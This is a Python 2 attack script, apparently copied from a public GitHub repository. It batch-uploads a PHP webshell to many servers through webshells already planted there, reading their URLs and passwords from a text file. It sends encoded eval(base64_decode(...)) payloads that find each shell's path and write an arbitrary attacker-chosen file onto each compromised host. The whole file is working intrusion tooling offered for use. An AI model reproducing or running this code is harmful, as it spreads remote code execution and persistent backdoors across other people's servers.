# coding=utf-8
# code from https://github.com/brianwrf/fileBatchUpload
import urllib
import urllib2
import sys
import base64
import re


def post(url,data):
    req = urllib2.Request(url)
    data = urllib.urlencode(data)
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    response = opener.open(req,data)
    return response.read()


def get_shell_path(posturl,passwd):
    shell_path = ""
    try:
        data = {}
        data[passwd] = '@eval(base64_decode($_POST[z0]));'
        data['z0'] = 'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'
        shell_path = post(posturl,data).strip()
    except Exception:
        pass
    return shell_path


def upload(localpath='shell.php'):
    print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'
    shellfile = 'webshell.txt'  # 存放webshell路径和密码的文件
    localfile = localpath  # 本地待上传的文件名
    shell_file = open(shellfile,'rb')
    local_content = str(open(localfile,'rb').read())
    for eachline in shell_file:
        posturl = eachline.split(',')[0].strip()
        passwd = eachline.split(',')[1].strip()
        try:
            reg = ".*/([^/]*\.php?)"
            match_shell_name = re.search(reg,eachline)
            if match_shell_name:
                shell_name = match_shell_name.group(1)
                shell_path = get_shell_path(posturl,passwd).strip()
                target_path = shell_path.split(shell_name)[0] + localfile
                target_path_base64 = base64.b64encode(target_path)
                target_file_url = eachline.split(shell_name)[0] + localfile
                data = {}
                data[passwd] = '@eval(base64_decode($_POST[z0]));'
                data[
                    'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'
                data['z1'] = target_path_base64
                data['z2'] = base64.b64encode(local_content)
                response = post(posturl,data)
                if response:
                    print '[+] ' + target_file_url + ', upload succeed!'
                else:
                    print '[-] ' + target_file_url + ', upload failed!'
            else:
                print '[-] ' + posturl + ', unsupported webshell!'
        except Exception,e:
            print '[-] ' + posturl + ', connection failed!'
    shell_file.close()


upload()